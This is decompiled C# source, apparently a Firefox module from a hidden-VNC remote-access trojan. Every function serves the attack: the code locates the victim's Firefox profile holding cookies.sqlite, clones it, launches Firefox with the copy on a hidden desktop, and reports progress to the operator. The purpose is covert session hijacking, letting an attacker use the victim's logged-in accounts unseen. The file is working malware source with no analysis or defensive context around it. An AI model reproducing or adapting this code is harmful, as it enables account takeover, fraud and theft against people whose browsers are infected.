using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp
{
	// Token: 0x0200000E RID: 14
	internal class FireFox
	{
		// Token: 0x0600005B RID: 91 RVA: 0x00003E00 File Offset: 0x00002000
		public static void OpenFireFoxBrowser()
		{
			HideDesktop.Load(Plugin.Helper.HVNCDesktop);
			try
			{
				bool flag = !File.Exists(FireFox.FilenameFireFox) && !File.Exists(FireFox.FilenameFireFoxX86);
				bool flag2 = flag;
				if (flag2)
				{
					Plugin.Helper.SendMSG("Firefox: Not Installed!");
				}
				else
				{
					try
					{
						bool flag3 = !Directory.Exists(FireFox.fileNameUserDataCopy);
						bool flag4 = flag3;
						if (flag4)
						{
							try
							{
								string str = string.Empty;
								string[] directories = Directory.GetDirectories(FireFox.fileNameUserData);
								int num = 0;
								string text;
								for (;;)
								{
									bool flag5 = num < directories.Length;
									bool flag6 = !flag5;
									bool flag7 = flag6;
									if (flag7)
									{
										break;
									}
									text = directories[num];
									string path = text + "\\cookies.sqlite";
									bool flag8 = !File.Exists(path);
									bool flag9 = !flag8;
									bool flag10 = flag9;
									if (flag10)
									{
										goto Block_11;
									}
									num++;
								}
								goto IL_D8;
								Block_11:
								str = Path.GetFileName(text);
								IL_D8:
								Plugin.Helper.SendMSG("Firefox: CloneProfile...");
								FireFox.PC.FileSystem.CopyDirectory(FireFox.fileNameUserData + "\\" + str, FireFox.fileNameUserDataCopy);
								Plugin.Helper.SendMSG("Firefox: CloneProfile Completed");
							}
							catch (Exception ex)
							{
								Plugin.Helper.SendMSG("Firefox: " + ex.Message);
							}
						}
					}
					catch
					{
						Debug.WriteLine("Error!");
					}
					Debug.WriteLine("Complete.///");
					new Thread(delegate()
					{
						Thread.Sleep(1000);
						HideDesktop.Load(Plugin.Helper.HVNCDesktop);
						FireFox.Open();
					}).Start();
				}
			}
			catch (Exception ex2)
			{
				Plugin.Helper.SendMSG("Firefox: " + ex2.Message);
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00003FF8 File Offset: 0x000021F8
		public static void Open()
		{
			try
			{
				string text = null;
				bool flag = File.Exists(FireFox.FilenameFireFox);
				if (flag)
				{
					text = FireFox.FilenameFireFox;
				}
				bool flag2 = File.Exists(FireFox.FilenameFireFoxX86);
				if (flag2)
				{
					text = FireFox.FilenameFireFoxX86;
				}
				bool flag3 = text == null;
				if (!flag3)
				{
					HideDesktop.CreateProcess(string.Concat(new string[]
					{
						"\"",
						text,
						"\" -no-remote -profile \"",
						FireFox.fileNameUserDataCopy,
						"\""
					}), Plugin.Helper.NameDesktop, false);
					Debug.WriteLine("Running.////");
					Plugin.Helper.SendMSG("Firefox: Running");
					Thread.Sleep(3000);
					HideDesktop.Load(Plugin.Helper.HVNCDesktop);
					Debug.WriteLine("Refresh");
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("Firefox: " + ex.Message);
			}
		}

		// Token: 0x0400002A RID: 42
		private static readonly Computer PC = new Computer();

		// Token: 0x0400002B RID: 43
		private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\Profiles";

		// Token: 0x0400002C RID: 44
		private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\FireFox Data";

		// Token: 0x0400002D RID: 45
		private static readonly string FilenameFireFox = WDir.SystemDirectory + "Program Files\\Mozilla Firefox\\firefox.exe";

		// Token: 0x0400002E RID: 46
		private static readonly string FilenameFireFoxX86 = WDir.SystemDirectory + "Program Files (x86)\\Mozilla Firefox\\firefox.exe";
	}
}
